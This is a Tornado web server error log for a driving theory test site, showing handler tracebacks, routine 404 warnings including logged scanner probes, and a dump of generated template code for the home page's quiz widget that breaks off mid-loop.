  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 99, in get
    self._execute_request(self.on_get, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 213, in _execute_request
    self.log.error(str(httperr))
AttributeError: 'ViewAdminPanelHandler' object has no attribute 'log'
ERROR:root:500 GET /admin (127.0.0.1) 6.79ms
WARNING:root:404 GET /static (127.0.0.1) 1.17ms
WARNING:root:404 GET /googlec3de338f5aca9a9e.html (127.0.0.1) 1.80ms
WARNING:root:404 GET /a (127.0.0.1) 0.81ms
WARNING:root:404 GET /googlec3de338f5aca9a9e.html (127.0.0.1) 0.81ms
WARNING:root:405 HEAD / (127.0.0.1) 1.44ms
WARNING:root:404 GET /h (127.0.0.1) 1.20ms
WARNING:root:404 GET /h (127.0.0.1) 1.21ms
WARNING:root:404 GET /h (127.0.0.1) 1.32ms
WARNING:root:404 GET /h (127.0.0.1) 0.38ms
ERROR:root:Uncaught exception GET /quiz/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='GET', uri='/quiz/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='', headers={'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:14.0) Gecko/20100101 Firefox/14.0.1', 'Accept-Charset': 'ISO-8859-1;utf-8;q=0.7,*;q=0.7', 'Connection': 'close', 'Cache-Control': 'max-age=259200', 'X-Real-Ip': '31.222.142.254'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 99, in get
    self._execute_request(self.on_get, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 213, in _execute_request
    self.log.error(str(httperr))
AttributeError: 'EvaluateHomeQuizHandler' object has no attribute 'log'
ERROR:root:500 GET /quiz/evaluate (127.0.0.1) 45.27ms
WARNING:root:404 GET /h (127.0.0.1) 0.73ms
WARNING:root:404 GET /googlec3de338f5aca9a9e.html (127.0.0.1) 1.31ms
WARNING:root:404 GET /w00tw00t.at.ISC.SANS.DFind:) (94.75.209.131) 0.85ms
WARNING:root:404 GET /googlec3de338f5aca9a9e.html (127.0.0.1) 2.24ms
WARNING:root:404 GET /h (127.0.0.1) 0.73ms
WARNING:root:404 GET /h (127.0.0.1) 2.26ms
WARNING:root:404 GET /user/soapCaller.bs (127.0.0.1) 0.73ms
WARNING:root:405 HEAD / (127.0.0.1) 0.66ms
WARNING:root:404 GET //wp-login.php (127.0.0.1) 0.74ms
WARNING:root:404 GET //wp-login.php (127.0.0.1) 1.27ms
WARNING:root:404 GET /blog//wp-login.php (127.0.0.1) 1.19ms
WARNING:root:404 GET /blog//wp-login.php (127.0.0.1) 1.03ms
WARNING:root:404 GET /wordpress//wp-login.php (127.0.0.1) 1.22ms
WARNING:root:404 GET /wp//wp-login.php (127.0.0.1) 1.08ms
WARNING:root:404 GET /wp//wp-login.php (127.0.0.1) 0.73ms
WARNING:root:404 GET /googlec3de338f5aca9a9e.html (127.0.0.1) 0.73ms
WARNING:root:404 GET /user/soapCaller.bs (127.0.0.1) 0.73ms
WARNING:root:404 GET /googlec3de338f5aca9a9e.html (127.0.0.1) 0.74ms
WARNING:root:405 HEAD / (127.0.0.1) 0.73ms
WARNING:root:405 HEAD / (127.0.0.1) 0.65ms
WARNING:root:404 GET /apple-touch-icon-114x114-precomposed.png (127.0.0.1) 0.73ms
WARNING:root:404 GET /apple-touch-icon-114x114.png (127.0.0.1) 3.78ms
WARNING:root:404 GET /apple-touch-icon-114x114-precomposed.png (127.0.0.1) 0.84ms
WARNING:root:404 GET /apple-touch-icon-114x114.png (127.0.0.1) 1.07ms
WARNING:root:404 GET /apple-touch-icon-precomposed.png (127.0.0.1) 1.13ms
WARNING:root:404 GET /apple-touch-icon.png (127.0.0.1) 1.13ms
WARNING:root:404 GET /apple-touch-icon-114x114-precomposed.png (127.0.0.1) 0.77ms
WARNING:root:404 GET /apple-touch-icon-114x114.png (127.0.0.1) 1.67ms
WARNING:root:404 GET /apple-touch-icon-precomposed.png (127.0.0.1) 1.06ms
WARNING:root:404 GET /apple-touch-icon.png (127.0.0.1) 1.09ms
ERROR:root:home.html code:
  1  def _execute():  # base.html:0
  2      _buffer = []  # base.html:0
  3      _append = _buffer.append  # base.html:0
  4      _append('<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">\n<!--[if lt IE 7 ]> <html lang="en" class="no-js ie6"> <![endif]-->\n<!--[if IE 7 ]> <html lang="en" class="no-js ie7"> <![endif]-->\n<!--[if IE 8 ]> <html lang="en" class="no-js ie8"> <![endif]-->\n<!--[if IE 9 ]> <html lang="en" class="no-js ie9"> <![endif]-->\n<!--[if (gt IE 9)|!(IE)]><!--> <html lang="en" class="no-js"> <!--<![endif]-->\n<head xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml">\n<meta charset="utf-8">\n<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">\n<meta name="author" content="intheory">\n<meta name="description" content="Intheory 2012">\n<meta property="og:image" content="http://www.petrominpng.com.pg/images/logo_big.png" />\n<meta name="viewport" content="width=920, initial-scale=auto">\n<meta property="og:type" content="website" />\n<meta property="og:title" content="Intheory 2012" />\n<meta property="og:site_name" content="Intheory 2012" />\n<title>\n')  # base.html:19
  5      _append('\nInTheory | Pass Your Theory Test. Guaranteed.\n')  # base.html:21 (via base.html:19)
  6      _append('\n</title>\n<link href="../static/css/bootstrap.css" rel="stylesheet">\n<link href="../static/css/bootstrap-responsive.css" rel="stylesheet">\n<link rel="stylesheet" href="')  # base.html:25
  7      _tmp = static_url('css/base.css')  # base.html:25
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:25
  9      else: _tmp = _utf8(str(_tmp))  # base.html:25
 10      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:25
 11      _append(_tmp)  # base.html:25
 12      _append('" />\n')  # base.html:26
 13      for css in kwargs['css_deps']:  # base.html:26
 14          _append('\n<link href="')  # base.html:27
 15          _tmp = static_url(css)  # base.html:27
 16          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:27
 17          else: _tmp = _utf8(str(_tmp))  # base.html:27
 18          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:27
 19          _append(_tmp)  # base.html:27
 20          _append('" rel="stylesheet">\n')  # base.html:28
 21      _append('\n<style type="text/css">\nhtml{\nbackground-image: url(/static/imgs/background.jpg);\nbackground-repeat: no-repeat;\n}\nbody {\npadding-top: 60px;\npadding-bottom: 40px;\n}\n</style>\n</head>\n<body >\n')  # base.html:44
 22      _append('\n<div class="navbar navbar-fixed-top">\n<div class="navbar-inner">\n<div class="container">\n<a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">\n<span class="icon-bar"></span>\n<span class="icon-bar"></span>\n<span class="icon-bar"></span>\n</a>\n<a class="brand" href="/"> <img src="')  # base.html:53 (via base.html:44)
 23      _tmp = static_url('imgs/logo.png')  # base.html:53 (via base.html:44)
 24      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:53 (via base.html:44)
 25      else: _tmp = _utf8(str(_tmp))  # base.html:53 (via base.html:44)
 26      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:53 (via base.html:44)
 27      _append(_tmp)  # base.html:53 (via base.html:44)
 28      _append('"></a>\n<div class="pull-right">\n')  # base.html:55 (via base.html:44)
 29      if not current_user:  # base.html:55 (via base.html:44)
 30          _append('\n<a href="/login"><button type="submit" class="btn btn-success">Sign in</button></a>\n')  # base.html:57 (via base.html:44)
 31      else:  # base.html:57 (via base.html:44)
 32          _append('\n<ul class="nav nav-pills">\n')  # base.html:59 (via base.html:44)
 33          if current_user['moderator']:  # base.html:59 (via base.html:44)
 34              _append('\n<li id="admin-nav"><a href="/admin">Admin</a></li>\n')  # base.html:61 (via base.html:44)
 35          _append('\n<li class="active"><a href="/learn/main">Learn</a></li>\n<li id="mock-test-nav"><a href="/test/new">Mock Test</a></li>\n<li><a href="#">Book Test</a></li>\n<li><a href="/logout">Logout</a></li>\n<li>|</li>\n</ul>\n<a class="brand1" href="/dashboard"> <img src="')  # base.html:68 (via base.html:44)
 36          _tmp = static_url('imgs/user.png')  # base.html:68 (via base.html:44)
 37          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:68 (via base.html:44)
 38          else: _tmp = _utf8(str(_tmp))  # base.html:68 (via base.html:44)
 39          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:68 (via base.html:44)
 40          _append(_tmp)  # base.html:68 (via base.html:44)
 41          _append('"></a>\n')  # base.html:69 (via base.html:44)
 42      _append('\n</div>\n</div>\n</div>\n</div>\n')  # base.html:74 (via base.html:44)
 43      _append('\n')  # base.html:76
 44      _append('\n<div class="container">\n<div class="hero-unit">\n<div class="hero-unit1">\n<div class="row-fluid">\n<div class="columnA pull-left">\n<h2>Pass your theory test.<br>Guaranteed.</h2>\n<ul>\n<li>The simplest and fastest way to pass your test.</li>\n<li>Use cool new learning techniques to help you remember the details.</li>\n<li>Don\'t pass first time? Get your money back.</li>\n</ul></br>\n<p><a id="get-started-btn" class="btn btn-block btn-success btn-large">Get Started Today</a></p>\n</div>\n<div class="columnB pull-right">\n</br>\n<div id="questions" data-questions=\n\'[{ "question":"')  # home.html:21 (via base.html:76)
 45      _tmp = kwargs["questions"][0].question  # home.html:21 (via base.html:76)
 46      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 47      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 48      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 49      _append(_tmp)  # home.html:21 (via base.html:76)
 50      _append('","options": ["')  # home.html:21 (via base.html:76)
 51      _tmp = kwargs["questions"][0].options[0]  # home.html:21 (via base.html:76)
 52      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 53      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 54      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 55      _append(_tmp)  # home.html:21 (via base.html:76)
 56      _append('", "')  # home.html:21 (via base.html:76)
 57      _tmp = kwargs["questions"][0].options[1]  # home.html:21 (via base.html:76)
 58      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 59      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 60      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 61      _append(_tmp)  # home.html:21 (via base.html:76)
 62      _append('", "')  # home.html:21 (via base.html:76)
 63      _tmp = kwargs["questions"][0].options[2]  # home.html:21 (via base.html:76)
 64      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 65      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 66      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 67      _append(_tmp)  # home.html:21 (via base.html:76)
 68      _append('", "')  # home.html:21 (via base.html:76)
 69      _tmp = kwargs["questions"][0].options[3]  # home.html:21 (via base.html:76)
 70      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 71      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 72      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 73      _append(_tmp)  # home.html:21 (via base.html:76)
 74      _append('"],"answer": ')  # home.html:21 (via base.html:76)
 75      _tmp = kwargs["questions"][0].answer  # home.html:21 (via base.html:76)
 76      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 77      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 78      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 79      _append(_tmp)  # home.html:21 (via base.html:76)
 80      _append('},{ "question":"')  # home.html:21 (via base.html:76)
 81      _tmp = kwargs["questions"][1].question  # home.html:21 (via base.html:76)
 82      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 83      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 84      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 85      _append(_tmp)  # home.html:21 (via base.html:76)
 86      _append('","options": ["')  # home.html:21 (via base.html:76)
 87      _tmp = kwargs["questions"][1].options[0]  # home.html:21 (via base.html:76)
 88      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 89      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 90      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 91      _append(_tmp)  # home.html:21 (via base.html:76)
 92      _append('", "')  # home.html:21 (via base.html:76)
 93      _tmp = kwargs["questions"][1].options[1]  # home.html:21 (via base.html:76)
 94      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 95      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 96      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 97      _append(_tmp)  # home.html:21 (via base.html:76)
 98      _append('", "')  # home.html:21 (via base.html:76)
 99      _tmp = kwargs["questions"][1].options[2]  # home.html:21 (via base.html:76)
100      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
101      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
102      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
103      _append(_tmp)  # home.html:21 (via base.html:76)
104      _append('", "')  # home.html:21 (via base.html:76)
105      _tmp = kwargs["questions"][1].options[3]  # home.html:21 (via base.html:76)
106      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
107      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
108      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
109      _append(_tmp)  # home.html:21 (via base.html:76)
110      _append('"],"answer": ')  # home.html:21 (via base.html:76)
111      _tmp = kwargs["questions"][1].answer  # home.html:21 (via base.html:76)
112      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
113      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
114      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
115      _append(_tmp)  # home.html:21 (via base.html:76)
116      _append('}, { "question":"')  # home.html:21 (via base.html:76)
117      _tmp = kwargs["questions"][2].question  # home.html:21 (via base.html:76)
118      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
119      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
120      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
121      _append(_tmp)  # home.html:21 (via base.html:76)
122      _append('","options": ["')  # home.html:21 (via base.html:76)
123      _tmp = kwargs["questions"][2].options[0]  # home.html:21 (via base.html:76)
124      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
125      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
126      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
127      _append(_tmp)  # home.html:21 (via base.html:76)
128      _append('", "')  # home.html:21 (via base.html:76)
129      _tmp = kwargs["questions"][2].options[1]  # home.html:21 (via base.html:76)
130      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
131      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
132      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
133      _append(_tmp)  # home.html:21 (via base.html:76)
134      _append('", "')  # home.html:21 (via base.html:76)
135      _tmp = kwargs["questions"][2].options[2]  # home.html:21 (via base.html:76)
136      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
137      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
138      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
139      _append(_tmp)  # home.html:21 (via base.html:76)
140      _append('", "')  # home.html:21 (via base.html:76)
141      _tmp = kwargs["questions"][2].options[3]  # home.html:21 (via base.html:76)
142      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
143      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
144      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
145      _append(_tmp)  # home.html:21 (via base.html:76)
146      _append('"],"answer": ')  # home.html:21 (via base.html:76)
147      _tmp = kwargs["questions"][2].answer  # home.html:21 (via base.html:76)
148      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
149      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
150      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
151      _append(_tmp)  # home.html:21 (via base.html:76)
152      _append('},{ "question":"')  # home.html:21 (via base.html:76)
153      _tmp = kwargs["questions"][3].question  # home.html:21 (via base.html:76)
154      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
155      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
156      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
157      _append(_tmp)  # home.html:21 (via base.html:76)
158      _append('","options": ["')  # home.html:21 (via base.html:76)
159      _tmp = kwargs["questions"][3].options[0]  # home.html:21 (via base.html:76)
160      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
161      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
162      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
163      _append(_tmp)  # home.html:21 (via base.html:76)
164      _append('", "')  # home.html:21 (via base.html:76)
165      _tmp = kwargs["questions"][3].options[1]  # home.html:21 (via base.html:76)
166      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
167      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
168      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
169      _append(_tmp)  # home.html:21 (via base.html:76)
170      _append('", "')  # home.html:21 (via base.html:76)
171      _tmp = kwargs["questions"][3].options[2]  # home.html:21 (via base.html:76)
172      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
173      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
174      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
175      _append(_tmp)  # home.html:21 (via base.html:76)
176      _append('", "')  # home.html:21 (via base.html:76)
177      _tmp = kwargs["questions"][3].options[3]  # home.html:21 (via base.html:76)
178      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
179      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
180      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
181      _append(_tmp)  # home.html:21 (via base.html:76)
182      _append('"],"answer": ')  # home.html:21 (via base.html:76)
183      _tmp = kwargs["questions"][3].answer  # home.html:21 (via base.html:76)
184      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
185      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
186      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
187      _append(_tmp)  # home.html:21 (via base.html:76)
188      _append('}, { "question":"')  # home.html:21 (via base.html:76)
189      _tmp = kwargs["questions"][4].question  # home.html:21 (via base.html:76)
190      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
191      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
192      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
193      _append(_tmp)  # home.html:21 (via base.html:76)
194      _append('","options": ["')  # home.html:21 (via base.html:76)
195      _tmp = kwargs["questions"][4].options[0]  # home.html:21 (via base.html:76)
196      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
197      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
198      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
199      _append(_tmp)  # home.html:21 (via base.html:76)
200      _append('", "')  # home.html:21 (via base.html:76)
201      _tmp = kwargs["questions"][4].options[1]  # home.html:21 (via base.html:76)
202      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
203      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
204      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
205      _append(_tmp)  # home.html:21 (via base.html:76)
206      _append('", "')  # home.html:21 (via base.html:76)
207      _tmp = kwargs["questions"][4].options[2]  # home.html:21 (via base.html:76)
208      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
209      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
210      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
211      _append(_tmp)  # home.html:21 (via base.html:76)
212      _append('", "')  # home.html:21 (via base.html:76)
213      _tmp = kwargs["questions"][4].options[3]  # home.html:21 (via base.html:76)
214      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
215      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
216      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
217      _append(_tmp)  # home.html:21 (via base.html:76)
218      _append('"],"answer": ')  # home.html:21 (via base.html:76)
219      _tmp = kwargs["questions"][4].answer  # home.html:21 (via base.html:76)
220      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
221      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
222      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
223      _append(_tmp)  # home.html:21 (via base.html:76)
224      _append('},{ "question":"')  # home.html:21 (via base.html:76)
225      _tmp = kwargs["questions"][5].question  # home.html:21 (via base.html:76)
226      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
227      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
228      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
229      _append(_tmp)  # home.html:21 (via base.html:76)
230      _append('","options": ["')  # home.html:21 (via base.html:76)
231      _tmp = kwargs["questions"][5].options[0]  # home.html:21 (via base.html:76)
232      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
233      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
234      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
235      _append(_tmp)  # home.html:21 (via base.html:76)
236      _append('", "')  # home.html:21 (via base.html:76)
237      _tmp = kwargs["questions"][5].options[1]  # home.html:21 (via base.html:76)
238      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
239      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
240      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
241      _append(_tmp)  # home.html:21 (via base.html:76)
242      _append('", "')  # home.html:21 (via base.html:76)
243      _tmp = kwargs["questions"][5].options[2]  # home.html:21 (via base.html:76)
244      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
245      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
246      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
247      _append(_tmp)  # home.html:21 (via base.html:76)
248      _append('", "')  # home.html:21 (via base.html:76)
249      _tmp = kwargs["questions"][5].options[3]  # home.html:21 (via base.html:76)
250      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
251      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
252      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
253      _append(_tmp)  # home.html:21 (via base.html:76)
254      _append('"],"answer": ')  # home.html:21 (via base.html:76)
255      _tmp = kwargs["questions"][5].answer  # home.html:21 (via base.html:76)
256      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
257      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
258      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
259      _append(_tmp)  # home.html:21 (via base.html:76)
260      _append('}, { "question":"')  # home.html:21 (via base.html:76)
261      _tmp = kwargs["questions"][6].question  # home.html:21 (via base.html:76)
262      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
263      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
264      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
265      _append(_tmp)  # home.html:21 (via base.html:76)
266      _append('","options": ["')  # home.html:21 (via base.html:76)
267      _tmp = kwargs["questions"][6].options[0]  # home.html:21 (via base.html:76)
268      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
269      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
270      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
271      _append(_tmp)  # home.html:21 (via base.html:76)
272      _append('", "')  # home.html:21 (via base.html:76)
273      _tmp = kwargs["questions"][6].options[1]  # home.html:21 (via base.html:76)
274      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
275      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
276      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
277      _append(_tmp)  # home.html:21 (via base.html:76)
278      _append('", "')  # home.html:21 (via base.html:76)
279      _tmp = kwargs["questions"][6].options[2]  # home.html:21 (via base.html:76)
280      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
281      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
282      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
283      _append(_tmp)  # home.html:21 (via base.html:76)
284      _append('", "')  # home.html:21 (via base.html:76)
285      _tmp = kwargs["questions"][6].options[3]  # home.html:21 (via base.html:76)
286      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
287      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
288      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
289      _append(_tmp)  # home.html:21 (via base.html:76)
290      _append('"],"answer": ')  # home.html:21 (via base.html:76)
291      _tmp = kwargs["questions"][6].answer  # home.html:21 (via base.html:76)
292      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
293      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
294      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
295      _append(_tmp)  # home.html:21 (via base.html:76)
296      _append('},{ "question":"')  # home.html:21 (via base.html:76)
297      _tmp = kwargs["questions"][7].question  # home.html:21 (via base.html:76)
298      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
299      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
300      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
301      _append(_tmp)  # home.html:21 (via base.html:76)
302      _append('","options": ["')  # home.html:21 (via base.html:76)
303      _tmp = kwargs["questions"][7].options[0]  # home.html:21 (via base.html:76)
304      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
305      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
306      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
307      _append(_tmp)  # home.html:21 (via base.html:76)
308      _append('", "')  # home.html:21 (via base.html:76)
309      _tmp = kwargs["questions"][7].options[1]  # home.html:21 (via base.html:76)
310      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
311      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
312      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
313      _append(_tmp)  # home.html:21 (via base.html:76)
314      _append('", "')  # home.html:21 (via base.html:76)
